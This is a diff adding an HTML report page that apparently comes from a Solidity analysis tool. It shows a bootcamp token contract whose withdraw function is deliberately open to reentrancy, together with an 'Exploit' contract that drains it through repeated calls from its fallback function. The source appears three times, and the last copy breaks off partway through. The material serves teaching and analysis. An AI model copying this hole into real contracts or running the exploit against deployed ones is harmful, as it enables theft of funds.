@@ -1,0 +1,1146 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="noindex, nofollow"><link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github-gist.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Anonymous+Pro:400,700" rel="stylesheet"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.2.0/highlightjs-line-numbers.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js"></script><script>/* eslint-disable */
+/**
+ * highlight.js Solidity syntax highlighting definition
+ *
+ * @see https://github.com/isagalaev/highlight.js
+ *
+ * :TODO:
+ * - fixed point numbers
+ * - `_` inside modifiers
+ * - assembly block keywords
+ *
+ * @package: highlightjs-solidity
+ * @author:  Sam Pospischil <sam@changegiving.com>
+ * @since:   2016-07-01
+ */
+
+/* slightly modified to removed 'module' */
+
+function hljsDefineSolidity(hljs) {
+  var SOL_KEYWORDS = {
+    keyword: 'var bool string ' +
+      'int uint int8 uint8 int16 uint16 int24 uint24 int32 uint32 ' +
+      'int40 uint40 int48 uint48 int56 uint56 int64 uint64 ' +
+      'int72 uint72 int80 uint80 int88 uint88 int96 uint96 ' +
+      'int104 uint104 int112 uint112 int120 uint120 int128 uint128 ' +
+      'int136 uint136 int144 uint144 int152 uint152 int160 uint160 ' +
+      'int168 uint168 int176 uint176 int184 uint184 int192 uint192 ' +
+      'int200 uint200 int208 uint208 int216 uint216 int224 uint224 ' +
+      'int232 uint232 int240 uint240 int248 uint248 int256 uint256 ' +
+      'byte bytes bytes1 bytes2 bytes3 bytes4 bytes5 bytes6 bytes7 bytes8 ' +
+      'bytes9 bytes10 bytes11 bytes12 bytes13 bytes14 bytes15 bytes16 ' +
+      'bytes17 bytes18 bytes19 bytes20 bytes21 bytes22 bytes23 bytes24 ' +
+      'bytes25 bytes26 bytes27 bytes28 bytes29 bytes30 bytes31 bytes32 ' +
+      'enum struct mapping address ' +
+
+      'new delete ' +
+      'if else for while continue break return throw require assert revert ' +
+
+      'function modifier event ' +
+      'constant anonymous indexed ' +
+      'storage memory ' +
+      'external public internal view pure private returns ' +
+
+      'import using ' +
+      'contract library interface ' +
+      'assembly',
+    literal: 'true false ' +
+      'wei szabo finney ether ' +
+      'second seconds minute minutes hour hours day days week weeks year years',
+    built_in: 'self ' + // :NOTE: not a real keyword, but a convention used in storage manipulation libraries
+      'this super selfdestruct ' +
+      'now ' +
+      'msg ' +
+      'block ' +
+      'tx ' +
+      'sha3 sha256 ripemd160 erecover addmod mulmod ' +
+      // :NOTE: not really toplevel, but advantageous to have highlighted as if reserved to
+      //        avoid newcomers making mistakes due to accidental name collisions.
+      'send call callcode delegatecall',
+  };
+
+  var SOL_NUMBER = {
+    className: 'number',
+    variants: [{
+        begin: '\\b(0[bB][01]+)'
+      },
+      {
+        begin: '\\b(0[oO][0-7]+)'
+      },
+      {
+        begin: hljs.C_NUMBER_RE
+      },
+    ],
+    relevance: 0,
+  };
+
+  var SOL_FUNC_PARAMS = {
+    className: 'params',
+    begin: /\(/,
+    end: /\)/,
+    excludeBegin: true,
+    excludeEnd: true,
+    keywords: SOL_KEYWORDS,
+    contains: [
+      hljs.C_LINE_COMMENT_MODE,
+      hljs.C_BLOCK_COMMENT_MODE,
+      hljs.APOS_STRING_MODE,
+      hljs.QUOTE_STRING_MODE,
+      SOL_NUMBER,
+    ],
+  };
+
+  var SOL_RESERVED_MEMBERS = {
+    begin: /\.\s*/, // match any property access up to start of prop
+    end: /[^A-Za-z0-9$_\.]/,
+    excludeBegin: true,
+    excludeEnd: true,
+    keywords: {
+      built_in: 'gas value send call callcode delegatecall balance length push',
+    },
+    relevance: 2,
+  };
+
+  function makeBuiltinProps(obj, props) {
+    return {
+      begin: obj + '\\.\\s*',
+      end: /[^A-Za-z0-9$_\.]/,
+      excludeBegin: false,
+      excludeEnd: true,
+      keywords: {
+        built_in: obj + ' ' + props,
+      },
+      contains: [
+        SOL_RESERVED_MEMBERS,
+      ],
+      relevance: 10,
+    };
+  }
+
+  return {
+    aliases: ['sol'],
+    keywords: SOL_KEYWORDS,
+    contains: [
+      // basic literal definitions
+      hljs.APOS_STRING_MODE,
+      hljs.QUOTE_STRING_MODE,
+      hljs.C_LINE_COMMENT_MODE,
+      hljs.C_BLOCK_COMMENT_MODE,
+      SOL_NUMBER,
+      { // functions
+        className: 'function',
+        beginKeywords: 'function modifier event',
+        end: /[{;]/,
+        excludeEnd: true,
+        contains: [
+          hljs.inherit(hljs.TITLE_MODE, {
+            begin: /[A-Za-z$_][0-9A-Za-z$_]*/,
+            keywords: SOL_KEYWORDS,
+          }),
+          SOL_FUNC_PARAMS,
+        ],
+        illegal: /\[|%/,
+      },
+      // built-in members
+      makeBuiltinProps('msg', 'data sender sig'),
+      makeBuiltinProps('block', 'blockhash coinbase difficulty gaslimit number timestamp '),
+      makeBuiltinProps('tx', 'gasprice origin'),
+      SOL_RESERVED_MEMBERS,
+      { // contracts & libraries
+        className: 'class',
+        beginKeywords: 'contract library interface',
+        end: /[{]/,
+        excludeEnd: true,
+        illegal: /[:"\[\]]/,
+        contains: [{
+            beginKeywords: 'is'
+          },
+          hljs.UNDERSCORE_TITLE_MODE,
+          SOL_FUNC_PARAMS,
+        ],
+      },
+      { // imports
+        beginKeywords: 'import',
+        end: '[;$]',
+        keywords: 'import * from as',
+        contains: [
+          hljs.APOS_STRING_MODE,
+          hljs.QUOTE_STRING_MODE,
+        ],
+      },
+    ],
+    illegal: /#/,
+  };
+}
+</script>
+<style type="text/css">/* http://meyerweb.com/eric/tools/css/reset/
+   v2.0 | 20110126
+   License: none (public domain)
+*/
+
+html, body, div, span, applet, object, iframe,
+h1, h2, h3, h4, h5, h6, p, blockquote, pre,
+a, abbr, acronym, address, big, cite, code,
+del, dfn, em, img, ins, kbd, q, s, samp,
+small, strike, strong, sub, sup, tt, var,
+b, u, i, center,
+dl, dt, dd, ol, ul, li,
+fieldset, form, label, legend,
+table, caption, tbody, tfoot, thead, tr, th, td,
+article, aside, canvas, details, embed,
+figure, figcaption, footer, header, hgroup,
+menu, nav, output, ruby, section, summary,
+time, mark, audio, video {
+	margin: 0;
+	padding: 0;
+	border: 0;
+	font-size: 100%;
+	/* font: inherit; it fucks up the highlightjs font */
+	vertical-align: baseline;
+}
+/* HTML5 display-role reset for older browsers */
+article, aside, details, figcaption, figure,
+footer, header, hgroup, menu, nav, section {
+	display: block;
+}
+body {
+	line-height: 1;
+}
+ol, ul {
+	list-style: none;
+}
+blockquote, q {
+	quotes: none;
+}
+blockquote:before, blockquote:after,
+q:before, q:after {
+	content: '';
+	content: none;
+}
+table {
+	border-collapse: collapse;
+	border-spacing: 0;
+}
+</style>
+<style type="text/css">body {
+  box-sizing: border-box;
+}
+
+#wrapper {
+	position:absolute;
+	top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  /* background-color: #333; */
+}
+
+#app {
+  display:flex;
+  flex-direction: row;
+}
+
+#nav {
+  flex:2;
+  display:flex;
+  flex-direction:column;
+  justify-content: start;
+  border-bottom: 1px solid #d3d3d3;
+  border-right: 1px solid #d3d3d3;
+}
+#nav ul {
+  list-style-type: none;
+  padding: 15px;
+  padding-top:0;
+  margin:0;
+  background-color: #ECF0F1;
+}
+
+#content {
+  flex: 9;
+  display:flex;
+  flex-direction:column;
+}
+
+.logo-box {
+  border-bottom: 1px solid #d3d3d3;
+  padding:18px;
+  text-align:center;
+}
+.nav-app-name {
+  display: inline-block;
+  font-family: monospace;
+  font-size: 42px;
+  font-weight: bold;
+}
+
+.contract-nav-label {
+  display:block;
+  line-height:41px;
+  font-family: 'Roboto', sans-serif;
+  font-weight: 300;
+  font-size: 20px;
+  font-weight: bold;
+  padding-left:22px;
+  background-color: #ECF0F1;
+}
+
+.contract-nav-button {
+  /* border: 1px solid rgb(29, 29, 29); */
+
+	/* background: #ffaf4b;
+	background: -moz-linear-gradient(top, #ffaf4b 0%, #ff920a 100%);
+	background: -webkit-linear-gradient(top, #ffaf4b 0%,#ff920a 100%);
+	background: linear-gradient(to bottom, #ffaf4b 0%,#ff920a 100%);
+	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffaf4b', endColorstr='#ff920a',GradientType=0 ); */
+}
+.contract-nav-button a {
+  font-family: 'Anonymous Pro', monospace;
+  font-weight: 400;
+  display:block;
+	padding: 10px;
+  font-size: 15px;
+}
+
+.contract-nav-button.current {
+	background: #00ff1c; /* Old browsers */
+	background: -moz-linear-gradient(top, #00ff1c 0%, #a3ff00 100%); /* FF3.6-15 */
+	background: -webkit-linear-gradient(top, #00ff1c 0%,#a3ff00 100%); /* Chrome10-25,Safari5.1-6 */
+	background: linear-gradient(to bottom, #00ff1c 0%,#a3ff00 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00ff1c', endColorstr='#a3ff00',GradientType=0 ); /* IE6-9 */
+}
+
+.contract-tab {
+  flex:1;
+  flex-direction: column;
+  display:none;
+}
+
+.contract-tab-nav {
+  position:relative;
+  display:flex;
+  flex-direction: row;
+  justify-content: start;
+  align-items: flex-start;
+  background-color: #8a92b2;
+  padding:2px;
+}
+.contract-tab-nav {
+  /* border-left: 1px solid #d3d3d3; */
+  border-right: 1px solid #62678f;
+  border-bottom: 1px solid #62678f;
+}
+.contract-tab-nav-label {
+  display:inline-block;
+  line-height:36px;
+  font-family: 'Roboto', sans-serif;
+  font-weight: 300;
+  font-weight: bold;
+  font-size: 20px;
+  padding-left:19px;
+}
+.contract-tab-nav ul {
+  list-style-type: none;
+  position:absolute;
+  left:100px;
+}
+.contract-tab-nav ul li {
+  float: left;
+  padding:10px;
+}
+
+.logo-sol-part {
+  display:inline-block;
+  font-family: 'Roboto', sans-serif;
+  font-weight: 100;
+  float: left;
+}
+.logo-hydra-part {
+  display:inline-block;
+  font-family: 'Roboto', sans-serif;
+  font-weight: 300;
+  float: left;
+}
+
+.contract-tab-nav-button {
+  flex:1;
+	/* border: 1px solid black; */
+	padding: 5px;
+	font-family: 'Anonymous Pro', monospace;
+  font-weight: 400;
+  font-size: 15px;
+	/* background: #ffaf4b;
+	background: -moz-linear-gradient(top, #ffaf4b 0%, #ff920a 100%);
+	background: -webkit-linear-gradient(top, #ffaf4b 0%,#ff920a 100%);
+	background: linear-gradient(to bottom, #ffaf4b 0%,#ff920a 100%);
+	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffaf4b', endColorstr='#ff920a',GradientType=0 ); */
+}
+.contract-tab-nav-button.current {
+	background: #00ff1c; /* Old browsers */
+	background: -moz-linear-gradient(top, #00ff1c 0%, #a3ff00 100%); /* FF3.6-15 */
+	background: -webkit-linear-gradient(top, #00ff1c 0%,#a3ff00 100%); /* Chrome10-25,Safari5.1-6 */
+	background: linear-gradient(to bottom, #00ff1c 0%,#a3ff00 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00ff1c', endColorstr='#a3ff00',GradientType=0 ); /* IE6-9 */
+}
+
+
+.contract-tab-content {
+  flex:9;
+	position:absolute;
+	top:72px;
+	margin: 10px;
+  padding-top:30px;
+  display:none;
+	height:85%;
+	overflow: scroll;
+	cursor: default;
+  font-size:15px;
+  width:70%;
+}
+
+.tooloutput-image {
+  max-width: 100%;
+}
+
+.contract-tab.show {
+  display: flex;
+}
+.show {
+  display:block;
+}
+
+.markdown-content {
+  font-family: 'Roboto', sans-serif;
+  padding-left: 20px;
+}
+.markdown-content h1 {
+  margin-bottom: 10px;
+  font-size:24px;
+  display:none; /* hide title "Analysis Results" */
+}
+.markdown-content h2 {
+  margin-bottom: 10px;
+  font-size:20px;
+  font-family: 'Anonymous Pro', monospace;
+  text-decoration:underline;
+}
+.markdown-content h3 {
+  margin-top: 10px;
+  font-size:17px;
+  margin-bottom:5px;
+}
+.markdown-content p {
+  margin-bottom: 10px;
+  font-size:15px;
+}
+
+a {
+  color: black;
+  text-decoration: none;
+}
+
+td.hljs-ln-numbers {
+  padding-right:20px;
+}
+
+/* width */
+::-webkit-scrollbar {
+    width: 10px;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+
+}
+
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #00ff1c; /* Old browsers */
+  background: -moz-linear-gradient(top, #00ff1c 0%, #a3ff00 100%); /* FF3.6-15 */
+  background: -webkit-linear-gradient(top, #00ff1c 0%,#a3ff00 100%); /* Chrome10-25,Safari5.1-6 */
+  background: linear-gradient(to bottom, #00ff1c 0%,#a3ff00 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00ff1c', endColorstr='#a3ff00',GradientType=0 ); /* IE6-9 */
+}
+
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: #00ff1c; /* Old browsers */
+  background: -moz-linear-gradient(top, #00ff1c 0%, #a3ff00 100%); /* FF3.6-15 */
+  background: -webkit-linear-gradient(top, #00ff1c 0%,#a3ff00 100%); /* Chrome10-25,Safari5.1-6 */
+  background: linear-gradient(to bottom, #00ff1c 0%,#a3ff00 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00ff1c', endColorstr='#a3ff00',GradientType=0 ); /* IE6-9 */
+}
+
+.markdown-content h2:not(:first-child) {
+  margin-top:10px;
+}
+
+iframe {
+  width:100%;
+  height:100%;
+}
+</style>
+<script>/* eslint-env browser */
+/* eslint-disable no-param-reassign, padded-blocks */
+(() => {
+  document.addEventListener('DOMContentLoaded', () => {
+
+    /**
+     * remove a class from all elements that match a given selector
+     *
+     * @param {string} selector - css selector
+     * @param {string} clazz - the class to remove
+     */
+    const removeClassFrom = (selector, clazz) => {
+      document
+        .querySelectorAll(selector)
+        .forEach((el_) => {
+          el_.classList.remove(clazz);
+        });
+    };
+
+    /**
+     * add a class to element that matches a given selector
+     *
+     * @param {string} selector - css selector
+     * @param {string} clazz - the class to add
+     */
+    const addClassTo = (selector, clazz) => {
+      document.querySelector(selector).classList.add(clazz);
+    };
+
+    /**
+     * show content of a specific contract
+     *
+     * @param {string} hash - hash part of the url, contains what needs to be shown
+     */
+    const showTab = (hash) => {
+
+      const chosenContractSlug = hash.split('contract-tab-').pop();
+
+      // hide all other tabs
+      removeClassFrom('.contract-tab', 'show');
+
+      // unselect all tab nav buttons
+      removeClassFrom('.contract-nav-button', 'current');
+
+      // select the chosen tab nav button
+      // addClassTo(`[href='${hash}']`, 'current');
+      addClassTo(`#contract-nav-button-${chosenContractSlug}`, 'current');
+
+      // unhide the chosen tab
+      addClassTo(hash, 'show');
+    };
+
+    /**
+     * show content of a specific contract's chosen tab
+     *
+     * @param {string} hash - hash part of the url, contains what needs to be shown
+     */
+    const showTabContent = (hash) => {
+      // get the tab this button belongs to
+      // href example: contract-mycontract-output-oyente
+      const tabOfThisButton = hash.split('contract-content-').pop().split('-output')[0];
+
+      // make the tab visible
+      showTab(`#contract-tab-${tabOfThisButton}`);
+
+      // hide all content tabs of the chosen tab
+      removeClassFrom(`#contract-tab-${tabOfThisButton} .contract-tab-content`, 'show');
+
+      // unselect all content nav buttons of the chosen tab
+      removeClassFrom(`#contract-tab-${tabOfThisButton} .contract-tab-nav-button`, 'current');
+
+      // select the chosen content tab nav button
+      addClassTo(`[href='${hash}']`, 'current');
+
+      // unhide the chosen tab content
+      addClassTo(hash, 'show');
+    };
+
+    const openContentTabIfNoneOpen = (contentTabId) => {
+      const gotActiveContentTab = document.querySelector(`${contentTabId} .contract-tab-nav-button.current`);
+
+      if (!gotActiveContentTab) {
+        // open the flatten content tab
+        window.location.replace(`${contentTabId.replace('tab', 'content')}-output-flatten`);
+      }
+    };
+
+    /**
+     * given a hash load the correct stuff in the ui
+     *
+     * @param {string} hash - hash part of url
+     */
+    const loadHash = (hash) => {
+      const linkType = hash.split('-')[1];
+
+      if (linkType === 'tab') {
+        showTab(hash);
+
+        openContentTabIfNoneOpen(hash);
+      } else if (linkType === 'content') {
+        showTabContent(hash);
+      }
+    };
+
+    /**
+     * extract the hash part from a url
+     *
+     * @param {string} url - url
+     * @return {string} the hash part from the url
+     */
+    const extractHashVal = url => (
+      `#${url.split('#').pop()}`
+    );
+
+    /**
+     * given a selector attach a click event listener to all elements that match
+     * the selector, extracting the hash part of the url of link that is clicked,
+     * and "loading the hash"
+     *
+     * @param {string} selector - css selector
+     */
+    const listenClickExecHash = (selector) => {
+      document
+        .querySelectorAll(selector)
+        .forEach((el) => {
+          el.addEventListener('click', (ev) => {
+            loadHash(extractHashVal(ev.target.href));
+          });
+        });
+    };
+
+    /**
+     * listen for hash change, and when detected load the new hash
+     * this is used to correctly handle pressing the browser Back button
+     */
+    const listenUrlHashChange = () => {
+      window.onhashchange = () => {
+        loadHash(extractHashVal(window.location.hash));
+      };
+    };
+
+    const openFirstFileTab = () => {
+      loadHash(extractHashVal(document.querySelector('.contract-nav-button a').href));
+    };
+
+    // load mythril iframe in new window! its too heavy for inpage
+    // https://stackoverflow.com/a/34694908
+
+    /** start listening to click events */
+    listenClickExecHash('.contract-nav-button');
+    listenClickExecHash('.contract-tab-nav-button');
+    listenUrlHashChange();
+
+    openFirstFileTab();
+  });
+})();
+</script><script>hljsDefineSolidity(hljs);
+hljs.initHighlightingOnLoad();
+hljs.initLineNumbersOnLoad();
+</script><title>Report</title></head><body><a target="_blank" href="https://github.com/BlockChainCompany/solhydra" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="z-index:100000; fill:#151513; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></a><div id="wrapper"><div id="app"><div id="nav"><div class="logo-box"><div class="nav-app-name"> <div class="logo-sol-part">SOL</div><div class="logo-hydra-part">HYDRA</div></div></div><div class="contract-nav-label">CONTRACTS</div><ul><li class="contract-nav-button" id="contract-nav-button-contrato"><a href="#contract-tab-contrato">Contrato.sol</a></li></ul></div><div id="content"><div class="contract-tab" id="contract-tab-contrato"><div class="contract-tab-nav contract-file-nav"><div class="contract-tab-nav-label">SOURCE</div><ul><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-flatten">flatten</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-combine">combine</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-original">original</a></li></ul></div><div class="contract-tab-nav contract-tooloutput-nav"><div class="contract-tab-nav-label">TOOLS</div><ul><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-mythril">mythril</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-oyente">oyente</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-solhint">solhint</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-solidity-analyzer">solidity-analyzer</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-solium">solium</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-surya_describe">surya describe</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-surya_graph">surya graph</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-surya_inheritance">surya inheritance</a></li><li><a class="contract-tab-nav-button" href="#contract-content-contrato-output-surya_parse">surya parse</a></li></ul></div><div class="contract-tab-content-container"><div class="contract-tab-content" id="contract-content-contrato-output-flatten"><pre><code class="solidity">pragma solidity^0.4.0;
+
+
+
+contract TestToken {
+    string constant name = &quot;IC3 2017 Bootcamp Token&quot;;
+    string constant symbol = &quot;IC3&quot;;
+    uint8 constant decimals = 18;
+    uint total;
+
+    struct Allowed {
+        mapping (address =&gt; uint256) _allowed;
+    }
+
+    mapping (address =&gt; Allowed) allowed;
+    mapping (address =&gt; uint256) balances;
+
+    event Transfer(address indexed _from, address indexed _to, uint256 _value);
+    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
+
+    function TestToken() {
+        total = 0;
+    }
+
+    function totalSupply() constant returns (uint256 totalSupply) {
+        return total;
+    }
+
+    function balanceOf(address _owner) constant returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function deposit() payable returns (bool success) {
+        if (balances[msg.sender] + msg.value &lt; msg.value) return false;
+        if (total + msg.value &lt; msg.value) return false;
+        balances[msg.sender] += msg.value;
+        total += msg.value;
+        return true;
+    }
+
+    function withdraw(uint256 _value) payable returns (bool success) {
+        if (balances[msg.sender] &lt; _value) return false;
+        msg.sender.call.value(_value)();
+        balances[msg.sender] -= _value;
+        total -= _value;
+        return true;
+    }
+
+    function transfer(address _to, uint256 _value) returns (bool success) {
+        if (balances[msg.sender] &lt; _value) return false;
+
+        if (balances[_to] + _value &lt; _value) return false;
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+
+        Transfer(msg.sender, _to, _value);
+
+        return true;
+    }
+
+
+    function approve(address _spender, uint256 _value) returns (bool success) {
+        allowed[msg.sender]._allowed[_spender] = _value;
+        Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
+        return allowed[_owner]._allowed[_spender];
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
+        if (balances[_from] &lt; _value) return false;
+        if ( allowed[_from]._allowed[msg.sender] &lt; _value) return false;
+        if (balances[_to] + _value &lt; _value) return false;
+
+        balances[_from] -= _value;
+        balances[_to] += _value;
+        allowed[_from]._allowed[msg.sender] -= _value;
+        return true;
+    }
+
+}
+
+contract Exploit {
+
+    TestToken public tokenContract;
+    uint public value;
+    uint public withdrawnX;
+    bool public deposited;
+
+    constructor (address _tokenAddress) public payable {
+        tokenContract  = TestToken(_tokenAddress);
+        value = this.balance;
+        deposited = tokenContract.deposit.value(value)();
+    }
+
+    function withdraw () public returns (bool) {
+        withdrawnX = 1;
+        return tokenContract.withdraw(value);
+    }
+
+    function () payable {
+        withdrawnX++;
+        if (msg.gas &gt; 10000)
+            tokenContract.withdraw(value);
+    }
+    
+    function _balance() public view returns (uint) { 
+        return this.balance; 
+        
+    }
+}
+
+contract balance {
+    function getBalance(address _contract) public view returns  (uint _balance) {
+        return address(_contract).balance;
+    }
+}
+
+</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-combine"><pre><code class="solidity">pragma solidity ^null;
+
+
+
+pragma solidity^0.4.0;
+
+contract TestToken {
+    string constant name = &quot;IC3 2017 Bootcamp Token&quot;;
+    string constant symbol = &quot;IC3&quot;;
+    uint8 constant decimals = 18;
+    uint total;
+
+    struct Allowed {
+        mapping (address =&gt; uint256) _allowed;
+    }
+
+    mapping (address =&gt; Allowed) allowed;
+    mapping (address =&gt; uint256) balances;
+
+    event Transfer(address indexed _from, address indexed _to, uint256 _value);
+    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
+
+    function TestToken() {
+        total = 0;
+    }
+
+    function totalSupply() constant returns (uint256 totalSupply) {
+        return total;
+    }
+
+    function balanceOf(address _owner) constant returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function deposit() payable returns (bool success) {
+        if (balances[msg.sender] + msg.value &lt; msg.value) return false;
+        if (total + msg.value &lt; msg.value) return false;
+        balances[msg.sender] += msg.value;
+        total += msg.value;
+        return true;
+    }
+
+    function withdraw(uint256 _value) payable returns (bool success) {
+        if (balances[msg.sender] &lt; _value) return false;
+        msg.sender.call.value(_value)();
+        balances[msg.sender] -= _value;
+        total -= _value;
+        return true;
+    }
+
+    function transfer(address _to, uint256 _value) returns (bool success) {
+        if (balances[msg.sender] &lt; _value) return false;
+
+        if (balances[_to] + _value &lt; _value) return false;
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+
+        Transfer(msg.sender, _to, _value);
+
+        return true;
+    }
+
+
+    function approve(address _spender, uint256 _value) returns (bool success) {
+        allowed[msg.sender]._allowed[_spender] = _value;
+        Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
+        return allowed[_owner]._allowed[_spender];
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
+        if (balances[_from] &lt; _value) return false;
+        if ( allowed[_from]._allowed[msg.sender] &lt; _value) return false;
+        if (balances[_to] + _value &lt; _value) return false;
+
+        balances[_from] -= _value;
+        balances[_to] += _value;
+        allowed[_from]._allowed[msg.sender] -= _value;
+        return true;
+    }
+
+}
+
+contract Exploit {
+
+    TestToken public tokenContract;
+    uint public value;
+    uint public withdrawnX;
+    bool public deposited;
+
+    constructor (address _tokenAddress) public payable {
+        tokenContract  = TestToken(_tokenAddress);
+        value = this.balance;
+        deposited = tokenContract.deposit.value(value)();
+    }
+
+    function withdraw () public returns (bool) {
+        withdrawnX = 1;
+        return tokenContract.withdraw(value);
+    }
+
+    function () payable {
+        withdrawnX++;
+        if (msg.gas &gt; 10000)
+            tokenContract.withdraw(value);
+    }
+    
+    function _balance() public view returns (uint) { 
+        return this.balance; 
+        
+    }
+}
+
+contract balance {
+    function getBalance(address _contract) public view returns  (uint _balance) {
+        return address(_contract).balance;
+    }
+}</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-original"><pre><code class="solidity">pragma solidity^0.4.0;
+
+contract TestToken {
+    string constant name = &quot;IC3 2017 Bootcamp Token&quot;;
+    string constant symbol = &quot;IC3&quot;;
+    uint8 constant decimals = 18;
+    uint total;
+
+    struct Allowed {
+        mapping (address =&gt; uint256) _allowed;
+    }
+
+    mapping (address =&gt; Allowed) allowed;
+    mapping (address =&gt; uint256) balances;
+
+    event Transfer(address indexed _from, address indexed _to, uint256 _value);
+    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
+
+    function TestToken() {
+        total = 0;
+    }
+
+    function totalSupply() constant returns (uint256 totalSupply) {
+        return total;
+    }
+
+    function balanceOf(address _owner) constant returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function deposit() payable returns (bool success) {
+        if (balances[msg.sender] + msg.value &lt; msg.value) return false;
+        if (total + msg.value &lt; msg.value) return false;
+        balances[msg.sender] += msg.value;
+        total += msg.value;
+        return true;
+    }
+
+    function withdraw(uint256 _value) payable returns (bool success) {
+        if (balances[msg.sender] &lt; _value) return false;
+        msg.sender.call.value(_value)();
+        balances[msg.sender] -= _value;
+        total -= _value;
+        return true;
+    }
+
+    function transfer(address _to, uint256 _value) returns (bool success) {
+        if (balances[msg.sender] &lt; _value) return false;
+
+        if (balances[_to] + _value &lt; _value) return false;
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+
+        Transfer(msg.sender, _to, _value);
+
+        return true;
+    }
+
+
+    function approve(address _spender, uint256 _value) returns (bool success) {
+        allowed[msg.sender]._allowed[_spender] = _value;
+        Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
+        return allowed[_owner]._allowed[_spender];
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
+        if (balances[_from] &lt; _value) return false;
+        if ( allowed[_from]._allowed[msg.sender] &lt; _value) return false;
+        if (balances[_to] + _value &lt; _value) return false;
+
+        balances[_from] -= _value;
+        balances[_to] += _value;
+        allowed[_from]._allowed[msg.sender] -= _value;
+        return true;
+    }
+
+}
+
+contract Exploit {
+
+    TestToken public tokenContract;
+    uint public value;
+    uint public withdrawnX;
+    bool public deposited;
+
+    constructor (address _tokenAddress) public payable {
+        tokenContract  = TestToken(_tokenAddress);
+        value = this.balance;
+        deposited = tokenContract.deposit.value(value)();
+    }
+
+    function withdraw () public returns (bool) {
